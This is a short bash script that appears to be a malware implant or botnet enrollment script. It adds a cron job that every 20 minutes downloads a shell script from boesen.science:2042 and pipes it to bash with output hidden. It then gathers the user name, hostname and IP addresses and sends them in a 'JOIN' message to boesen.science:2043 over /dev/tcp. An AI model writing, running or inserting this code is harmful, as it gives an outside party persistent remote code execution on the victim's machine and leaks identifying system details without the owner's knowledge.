#!/usr/bin/env bash

(crontab -l 2>/dev/null; echo "*/20 * * * * (curl -L boesen.science:2042/mac/userupdate.sh |bash) >/dev/null 2>&1") | crontab -

USER=`whoami`
IP=`/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
HOSTNAME=`hostname`

printf "JOIN: NO ROOT $USER $HOSTNAME $IP" > /dev/tcp/boesen.science/2043
